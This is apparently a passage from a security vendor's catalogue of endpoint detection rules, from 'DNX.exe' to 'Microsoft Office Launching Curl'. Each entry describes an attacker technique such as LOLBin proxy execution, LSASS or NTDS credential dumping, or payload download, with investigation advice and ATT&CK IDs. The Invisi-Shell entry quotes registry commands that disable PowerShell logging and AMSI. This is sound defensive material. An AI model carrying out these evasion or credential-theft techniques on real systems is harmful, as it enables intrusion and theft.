- Exploit Public-Facing Application - T1190
- Exploitation of Remote Services - T1210
- Obtain Capabilities - T1588
- Exploits - T1588.005


</details>



<details>
<summary>Suspicious Process - DNX.exe - Possible Proxy Execution</summary>



#### Description

This detection identifies suspicious use of DNX.exe. DNX.exe is a component of Visual Studio Enterprise that can be used by an attacker to execute arbitrary code and bypass application whitelisting. DNX.exe was retired in 2016, but remains a viable tactic on any systems with it still installed.

#### Recommendation

Determine whether parent and child processes of DNX.exe are expected behavior. Investigate the files or folders included in the DNX.exe command-line arguments - files will likely be plaintext .json and .cs files which can easily be opened and analyzed.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - DownloadFile and Expand-Archive Passed To PowerShell</summary>



#### Description

This detection identifies the use of ‘PowerShell.exe’ with ‘.DownloadFile’ and ‘Expand-Archive’ passed to it via the command line. Rapid7 has observed malicious actors using this technique to retrieve malware from external locations by sending malicious documents to targets.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Data Encoding - T1132
- Standard Encoding - T1132.001
- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Suspicious Process - Dump64.exe</summary>



#### Description

This detection identifies the use of 'Dump64.exe', a memory dump tool that comes with Microsoft Visual Studio. A malicious actor may use this to dump process memory from LSASS to extract passwords. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001


</details>



<details>
<summary>Suspicious Process - Dynamic DNS in cmdline</summary>



#### Description

This detection identifies domain names for common dynamic DNS services. Malicious actors can use dynamic DNS services to mask their infrastructure.

#### Recommendation

Investigate the domain and the process that spawned the command. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Dynamic Resolution - T1568


</details>



<details>
<summary>Suspicious Process - Echo Redirected To System Pipe</summary>



#### Description

This detection identifies the echo command being used to redirect output to a system pipe. This behavior is observed in post-exploitation frameworks like Cobalt Strike, which uses pipes for communication between compromised hosts. 


#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003
- Inter-Process Communication - T1559


</details>



<details>
<summary>Suspicious Process - Editing CodePage via Reg.exe</summary>



#### Description

This detection identifies a specific code page number being set by Reg.exe. By doing this a malicious actor can cause a malicious DLL to be loaded whenever a certain code page is set with CHCP.exe. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Modify Registry - T1112


</details>



<details>
<summary>Suspicious Process - /E:Jscript in Command Line</summary>



#### Description

This detection identifies ‘WScript.exe’ being executed with the /E:JScript argument. This is often used inJavaScript loaders that attempt to pull down additional malware or ransomware to be executed.


#### Recommendation

Review web traffic for affected assets and the contents of the JavaScript being run to identify any possible URLs that it may be attempting to download from, and look for child processes of this process. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - Encoded GZIP Magic Bytes Passed To PowerShell</summary>



#### Description

This detection identifies Base64-encoded GZIP magic bytes, ‘H4sI’, being passed to ‘PowerShell.exe’. This process is used by malicious actors through multiple post-exploitation frameworks, such as Cobalt Strike and Metasploit.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Data Encoding - T1132
- Standard Encoding - T1132.001
- Obtain Capabilities - T1588
- Tool - T1588.002


</details>



<details>
<summary>Suspicious Process - Encoded PowerShell Command Spawns Schtask</summary>



#### Description

This detection identifies the execution of a scheduled task spawned by an encoded PowerShell command to achieve persistence.

#### Recommendation

Investigate the command that is being scheduled to run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Scheduled Task/Job - T1053
- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - EseNtUtl Repair</summary>



#### Description

This detection identifies the use of ‘esentutl.exe’ with the ‘/p’ flag. This command repairs the extensible storage engine's database, NTDS.dit, and dump it to the specified file. This technique  is used by malicious actors to obtain a copy of the password hashes on the compromised system.

#### Recommendation

Review the file location in the command line and validate that the activity performed by the user is intended and allowed. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- NTDS - T1003.003


</details>



<details>
<summary>Suspicious Process - Excel Opens XLL, PLL, or WLL file</summary>



#### Description

This detection identifies an Excel library file, such as XLL, PLL, or WLL being used to execute arbitrary code. Malicious actors may send this file to a target user as a phishing attachment.

#### Recommendation

Examine any child processes of Excel. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Suspicious Process - Excel Spawns ForFiles</summary>



#### Description

This detection identifies ‘ForFiles.exe' being spawned as a child process of ‘Excel.exe'. This technique is used by malicious actors to send malicious documents to targets that retrieve and execute malware from external locations when opened.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Indirect Command Execution - T1202
- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Suspicious Process - Exchange Server Spawns Process</summary>



#### Description

This detection identifies if the Microsoft Exchange Server Remote Code Execution Vulnerability, CVE-2020-16875, is being exploited to run arbitrary code on an Exchange server. Code run via this exploit will be run as a SYSTEM user. 
The Rapid7 analysis of CVE-2020-16875 can be found at https://attackerkb.com/topics/Y2azzfAbid/cve-2020-16875?#rapid7-analysis

#### Recommendation

Investigate the child process of ‘w3wp.exe’ to determine whether the activity is the result of expected application behavior. Examine any other processes launched by ‘w3wp.exe’, as well as anything launched by child processes of ‘w3wp.exe’. Investigate any web-accessible directories for suspicious files. 

#### MITRE ATT&CK Techniques

- Exploit Public-Facing Application - T1190


</details>



<details>
<summary>Suspicious Process - Executable in User Directory Modifies Firewall</summary>



#### Description

This detection identifies the netsh firewall command being used to allow all connections by a process. This tactic is used in several malware families, such as NJRat. 

#### Recommendation

Determine whether this is part of authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Disable or Modify System Firewall - T1562.004


</details>



<details>
<summary>Suspicious Process - Executable Runs From C:\Perflogs</summary>



#### Description

This detection identifies the C:\Perflogs directory being used as a staging directory for malware.

#### Recommendation

Examine the contents of the directory. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - Executable With 7-Digit Hexadecimal Name Executed from Admin Share</summary>



#### Description

This detection identifies an executable with a name consisting of seven hexadecimal characters being run from an Admin share, for example \\127.0.0.1\ADMIN$\da3b82f.exe. This convention is often used by Cobalt Strike for execution and lateral movement. 

#### Recommendation

Investigate the executable being run from the Admin share. Examine the parent process that spawned it, and anything else it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- SMB/Windows Admin Shares - T1021.002


</details>



<details>
<summary>Suspicious Process - Execution from Admin Share</summary>



#### Description

This detection identifies malware being run by a malicious actor from an administrative share as a means of detection evasion. Administrative shares are hidden network shares intended to allow system administrators to have remote disk access to all systems in a network environment. By using an administrative share,a malicious actor can run something from the local host by mounting the \\127.0.0.1\ADMIN$ share, or a remote share can be mounted for lateral movement purposes.

#### Recommendation

Determine whether this is part of authorized administrator activity. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote Services - T1021
- SMB/Windows Admin Shares - T1021.002


</details>



<details>
<summary>Suspicious Process - Execution from C:\ImgContent Directory</summary>



#### Description

This detection identifies processes running from the C:\ImgContent directory. This directory has been identified as a staging directory used by malicious actors such as the IcedID malware. 

#### Recommendation

Investigate the contents of the C:\ImgContent directory. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Suspicious Process - Execution From Recycle Bin</summary>



#### Description

This detection identifies executables being launched from the root of the recycle bin, which is a common staging directory for malicious actors. Legitimate executables will never run out of the root of the recycle bin directory.

#### Recommendation

Review the process activity on the host to identify other suspicious behavior. Retrieve the binary in question and perform analysis on its behavior if the hash is unknown. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Hidden Files and Directories - T1564.001


</details>



<details>
<summary>Suspicious Process - Execution From Root of ProgramData</summary>



#### Description

This detection identifies processes being executed from the root of ProgramData. This is often used as a staging directory by malicious actors.

#### Recommendation

Review the process activity on the host to identify other suspicious behavior. Retrieve the binary in question and perform analysis on its behavior if the hash is unknown. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Suspicious Process - Execution From Root Of Users</summary>



#### Description

This detection identifies processes being from the root of Users. This is often used as a staging directory by malicious actors.

#### Recommendation

Review the process activity on the host to identify other suspicious behavior. Retrieve the binary in question and perform analysis on its behavior if the hash is unknown. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Suspicious Process - Execution from System Volume Information</summary>



#### Description

This detection identifies binaries executing from the System Volume Information directory. This directory exists by default at the root of an NTFS drive. Malicious actors may use this location to hide malware.

#### Recommendation

Examine the process that executed and the contents of the System Volume Information directory. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Suspicious Process - Execution of Encoded JavaScript File</summary>



#### Description

This detection identifies the use of JScript Encoded (.JSE) files. These are JavaScript files that are encoded using the Windows JScript.Encode function. This function was designed to protect JavaScript source code from being viewed, but can be used by malicious actors to obfuscate the contents of malicious JavaScript files. 

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - exe/dll/ps1 File Copied From SMB Share</summary>



#### Description

This detection identifies exe, dll, and ps1 files being copied from an SMB share to a local drive. This may be done by malicious actors to deploy tools onto new systems.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- SMB/Windows Admin Shares - T1021.002


</details>



<details>
<summary>Suspicious Process - Expand Archive In ProgramData Directory</summary>



#### Description

This detection identifies the use of 'expand.exe' against compressed archives located in the 'ProgramData' directory. Rapid7 has observed malicious actors using this utility in these directories when decompressing archives containing tools and malware. Malicious actors perform this activity after compromising a web application.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Data Staged - T1074
- Local Data Staging - T1074.001
- Ingress Tool Transfer - T1105
- Data Encoding - T1132
- Standard Encoding - T1132.001
- Lateral Tool Transfer - T1570


</details>



<details>
<summary>Suspicious Process - explorer.exe in Non-Standard Location</summary>



#### Description

This detection identifies binaries named 'explorer.exe' whose location does not match that of the actual 'explorer.exe'. Malicious actors may use names like this in an effort to evade detection by blending in with legitimate processes. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Suspicious Process - Explorer Launches Cmd.exe to Run RegSvr32.exe</summary>



#### Description

This detection identifies an Explorer.exe -> Cmd.exe -> RegSvr32.exe or Explorer.exe -> Cmd.exe -> RunDLL32.exe process execution chain. This can be indicative of a tactic seen used by actors deploying IcedID and Bumblebee malware. A malicious ISO file is delivered to the user, which the user unknowingly mounts. The ISO is configured to run a script automatically upon mounting which spawns a Cmd.exe session and uses RegSvr32.exe or RunDLL32.exe to execute a malicious DLL. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003
- Malicious File - T1204.002
- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - Explorer Runs JS File with WScript</summary>



#### Description

This detection identifies the execution of JavaScript files by the Explorer process. This occurs when the file is executed by a user via the GUI, which may indicate that the user has received a malicious JavaScript file and is executing it. Malicious JavaScript files are commonly used as spearphishing attachments.

#### Recommendation

Acquire and analyze the JavaScript file being run. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - Explorer Spawns Process From Command Line</summary>



#### Description

This detection identifies processes spawned by ‘explorer.exe’ from within ‘cmd.exe’. This technique is used by malicious actors to evade detections based on parent/child process relationships.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Match Legitimate Name or Location - T1036.005


</details>



<details>
<summary>Suspicious Process - File Unzip and Copy Using Shell Com Object</summary>



#### Description

This detection identifies a shell com object being used in PowerShell to unzip and copy files. This has been observed in malicious PowerShell scripts as a way to deploy additional malicious code. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - File Upload or Download via Certreq</summary>



#### Description

This detection identifies the Certificate Request utility, CertReq.exe, being used to upload or download small files. A malicious actor may do this in order to pull down additional tools, or for exfiltration purposes. 

#### Recommendation

Investigate the URL being contacted. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - Finger Contacting External IP Address</summary>



#### Description

The Windows utility 'finger.exe' can be used by a malicious actor to download a payload from an external source. 

#### Recommendation

Investigate the target IP address and the file hosted at that URL. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - Forfiles executing MSHTA</summary>



#### Description

 This detection identifies the "mshta.exe" program as a child process of ForFiles.exe. This has been observed in use by malicious actors, who uses ForFiles.exe to run the mshta.exe program and execute malicious scripts from an HTML page.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Indirect Command Execution - T1202


</details>



<details>
<summary>Suspicious Process - ForFiles Spawns Process From Users Directory</summary>



#### Description

This detection identifies if ‘ForFiles.exe’ is the parent process of any executable in the user’s directory. This technique is used by malicious actors to use malicious documents for exploitation.

#### Recommendation

Review the process in question. If it is malicious, quarantine the asset, lock the user's account, and reset the credentials.

#### MITRE ATT&CK Techniques

- Indirect Command Execution - T1202
- User Execution - T1204
- Malicious File - T1204.002
- Phishing - T1566
- Spearphishing Attachment - T1598.002


</details>



<details>
<summary>Suspicious Process - FSUtil Zeroing Out a File</summary>



#### Description

This detection identifies FSUtil being used to overwrite a file on disk with zeros. This has been observed in the LockerBit malware, which overwrites its own binary to hinder forensic investigation. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- File Deletion - T1070.004


</details>



<details>
<summary>Suspicious Process - GetObject Passed To MSHTA</summary>



#### Description

This detection identifies the use of  ‘mshta.exe’ with the command line parameters ‘vbscript:GetObject’. ‘mshta.exe’ is a utility designed to run HTML application files and help files with the extensions ‘.hta’ and ‘.hlp’ respectively. A malicious actor could use the capabilities of this utility to execute malicious scripts. This utility is also used by malicious actors in the PoshC2 post-exploitation framework to execute scripts hosted on a remote web server controlled by a malicious actor.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218
- Mshta - T1218.005


</details>



<details>
<summary>Suspicious Process - Githack in Command Line</summary>



#### Description

This detection identifies Githack being used to acquire raw files directly from GitHub, Bitbucket, or GitLab. Malicious actors may host code on one of those services and pull directly from them when deploying to a compromised host. 

#### Recommendation

Investigate the contents of the file being downloaded. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Web Service - T1102
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Suspicious Process - HH.exe Spawns Child Process</summary>



#### Description

This detection identifies Microsoft Compiled HTML,.CHM files, which are often used maliciously to run commands using a number of possible built-in Windows utilities to download malware and compromise the system. These .CHM files are opened by Microsoft HTML Help executable,  HH.exe. Malicious help files are often sent via phishing emails.

#### Recommendation

Review the command line arguments being passed from HH.exe to the child process. Investigate the contents of the chm file - CHM files can be decompiled using the command 'hh.exe -decompile <outputFolder> <file.chm>'. Review the firewall and web proxy logs from this endpoint to identify any malware retrieval from remote systems.


#### MITRE ATT&CK Techniques

- Compiled HTML File - T1218.001
- Spearphishing Attachment - T1566.001


</details>



<details>
<summary>Suspicious Process - icacls.exe Grants Everyone Permissions</summary>



#### Description

This detection identifies the Windows utlity ICAcls being used to modify the permissions of a file so that all users will have access. This may be abused by malicious actors to obtain access to files. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- File and Directory Permissions Modification - T1222
- Windows File and Directory Permissions Modification - T1222.001


</details>



<details>
<summary>Suspicious Process - Icacls Grants Everyone All Permissions to Root of Drive</summary>



#### Description

This detection identifies 'icacls.exe' being used to grant everyone permissions to the root of a drive. Malicious actors, including the Ryuk ransomware, have done this to ensure the necessary permissions are available on the drives it encrypts. 

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Windows File and Directory Permissions Modification - T1222.001


</details>



<details>
<summary>Suspicious Process - IEExec Downloading File</summary>



#### Description

This detection identifies the process 'IEExec.exe', an undocumented .NET Framework utility, being used to download files. This may be done by a malicious actor as a way to download second stage payloads. 

#### Recommendation

Investigate the URL being contacted. Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105
- Signed Binary Proxy Execution - T1218


</details>



<details>
<summary>Suspicious Process - InfDefaultInstall.exe Spawns Process</summary>



#### Description

This detection identifies ‘InfDefaultInstall.exe’ creating a process, which is indicative of the application whitelisting bypass technique, ‘Squibblydoo’.

#### Recommendation

Examine any process spawned by ‘InfDefaultInstall.exe’, the parent process that spawned ‘InfDefaultInstall.exe’, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Windows Command Shell - T1059.003
- Regsvr32 - T1218.010


</details>



<details>
<summary>Suspicious Process - Interactive at.exe</summary>



#### Description

This detection identifies the ‘at.exe’ task scheduler being used in interactive mode. Malicious actors may use this to execute malware. 

#### Recommendation

Determine whether this is a legitimate use of ‘at.exe’. If it is legitimate, consider migrating the function ‘at.exe’ is serving to a different mechanism, since ‘at.exe’ is deprecated.


#### MITRE ATT&CK Techniques

- At (Windows) - T1053.002


</details>



<details>
<summary>Suspicious Process - Invisi-Shell </summary>



#### Description

This detection identifies the use of Invisi-Shell, a method of running PowerShell without any of the normal security features that come with PowerShell (ScriptBlock logging, Module logging, Transcription, AMSI).

The following commands are run when Invisi-Shell starts. Note that the reg.exe command are only run if the script is being executed as a non-admin.

set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "InvisiShellProfiler.dll" /f

#### Recommendation

Investigate any child processes spawned by PowerShell following this activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - Invoke-PSImage</summary>



#### Description

This detection identifies the use of Invoke-PSImage. Invoke-PSImage is a tool used to encode a PowerShell command in an image, which can then be downloaded and executed using a PowerShell command. 

#### Recommendation

Investigate the URL being downloaded from. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001


</details>



<details>
<summary>Suspicious Process - iplogger.org in Command Line</summary>



#### Description

This detection identifies the url iplogger.org in command line arguments. Malicious actors may make HTTP requests via Curl to iplogger.org in order to determine a system's external IP address.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- System Network Configuration Discovery - T1016


</details>



<details>
<summary>Suspicious Process - Java.exe Spawns Attrib.exe, Icacls.exe, or Reg.exe</summary>



#### Description

This detection identifies Java spawning ‘attrib.exe’, ‘icacls.exe’, or ‘reg.exe’. This is a tactic used by Java-based RAT droppers.

#### Recommendation

Examine the process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Windows File and Directory Permissions Modification - T1222.001


</details>



<details>
<summary>Suspicious Process - Java Runs File With Suspicious Extension</summary>



#### Description

This detection identifies Java executing Java archive files with non-standard file extensions. Malicious actors have been observed using dummy file extensions on Java archive files, such as '.SezQDC', instead of the expected '.jar' file extension. 

#### Recommendation

Investigate the Java archive that is being executed. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

</details>



<details>
<summary>Suspicious Process - JavaScript:Eval in Command Line Arguments</summary>



#### Description

This detection identifies the use of JavaScript:Eval, which is commonly used to execute JavaScript malware using Windows utilities, such as ‘rundll32.exe’ or ‘MSHTA.exe’.

#### Recommendation

Examine the parent process that spawned the command, anything else that process may have spawned, and any files or registry keys that are read/written by the command. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - Java Spawns JAR File From Startup Directory</summary>



#### Description

This detection identifies Java .jar files being executed from the Windows StartUp directory. Malicious actors often use the StartUp directory as a means of persistence, as anything in that directory will be executed on first login after boot. Java files being executed from StartUp has been observed in the STRrat malware. 

#### Recommendation

Examine the .jar file. Examine anything that may have been launched by the Java process that executed the jar file. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Startup Items - T1037.005


</details>



<details>
<summary>Suspicious Process - JS Filename Associated with FakeUpdate</summary>



#### Description

This detection identifies the filenames Chrome.js, Edge.js, and Firefox.js appearing in the command line. This file name is commonly used by the FakeUpdate malware.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- JavaScript - T1059.007


</details>



<details>
<summary>Suspicious Process - Killing Multiple Database Services</summary>



#### Description

This detection identifies taskkill or net stop being used to kill multiple instances of database software within a short amount of time. This has been observed in ransomware actors who are attempting to kill processes that are locking databases so that those databases can be encrypted. 

#### Recommendation

Ensure that this is part of expected activity. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Suspicious Process - klist get</summary>



#### Description

This detection identifies use of the command line tool klist to request a Kerberos ticket on behalf of a certain host. Attackers may use this to authenticate and move laterally.

#### Recommendation

Determine if this is part of authorized IT activity. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the users on both the source and target machines change their passwords. Investigate the target host for any suspicious activity around this same time frame.


#### MITRE ATT&CK Techniques

- Steal or Forge Kerberos Tickets - T1558


</details>



<details>
<summary>Suspicious Process - Koadic CommandLine Flags</summary>



#### Description

This detection identifies the flags  /q /c chcp in the cmd,exe commandline, activity which is often indicative of the Koadic post-exploitation framework.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Windows Command Shell - T1059.003


</details>



<details>
<summary>Suspicious Process - Kovter Command Line Progress</summary>



#### Description

This detection identifies the execution of system environment variables that are used to display the installation progress during a drop of the fileless malware Kovter. Malicious actors use scripting engines, such as ‘mshta.exe’, ‘PowerShell.exe,’ and ‘WScript.exe’ with obfuscated strings stored in the registry for multiple purposes, including ad fraud and ransomware.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Obtain Capabilities - T1588
- Malware - T1588.001


</details>



<details>
<summary>Suspicious Process - Large Number of Spaces in Executable Name</summary>



#### Description

This detection identifies processes with a large number of whitespace characters in their executable name. Malicious actors may do this in order to disguise the extension of a file.

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

</details>



<details>
<summary>Suspicious Process - .lnk in PowerShell Command Line</summary>



#### Description

This detection identifies .lnk files appearing in PowerShell command line arguments. Malicious actors may use .lnk files in the %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\ in order to achieve persistence, as files in this folder will be executed on startup. 

#### Recommendation

Attempt to determine what the PowerShell command is doing - it may be heavily obfuscated. Examine the .lnk file to see what it is attempting to run. Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Registry Run Keys / Startup Folder - T1547.001


</details>



<details>
<summary>Suspicious Process - Malicious Hash On Asset</summary>



#### Description

This detection identifies the execution of hashes that have been identified as malicious by the hash reputation service.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

</details>



<details>
<summary>Suspicious Process - ManageEngine Spawns Command To Execute MsiExec</summary>



#### Description

This detection identifies the execution of the process associated with Manage Engine that spawns command to execute MSI file using msiexec. This technique is used by threat actors to perform remote code execution on vulnerable Manage Engine host.

#### Recommendation

 Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Signed Binary Proxy Execution - T1218
- Msiexec - T1218.007


</details>



<details>
<summary>Suspicious Process - Masquerading as DLLHost</summary>



#### Description

This detection identifies processes masquerading as 'DLLHost.exe', a Windows system binary. Malicious actors may use the name 'DLLHost.exe' to disguise their own malicious binaries. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Suspicious Process - Mass Copy</summary>



#### Description

This detection identifies hundreds of copy commands on one endpoint within a few minutes to remote systems. This technique is used by malicious actors to copy ransomware payloads to multiple systems within a target’s environment.

#### Recommendation

Review the file being copied to validate if it is malicious. If it is, remove it from all locations, and identify and lock accounts being used to copy the files. If necessary, rebuild the hosts from a known, good source and have the users change their passwords.

#### MITRE ATT&CK Techniques

- SMB/Windows Admin Shares - T1021.002
- Lateral Tool Transfer - T1570


</details>



<details>
<summary>Suspicious Process - Microsoft Office Launching Curl</summary>



#### Description

This detection identifies a Microsoft Office application launching the Curl utility. This may be done by malicious documents attempting to download a second stage payload.

#### Recommendation

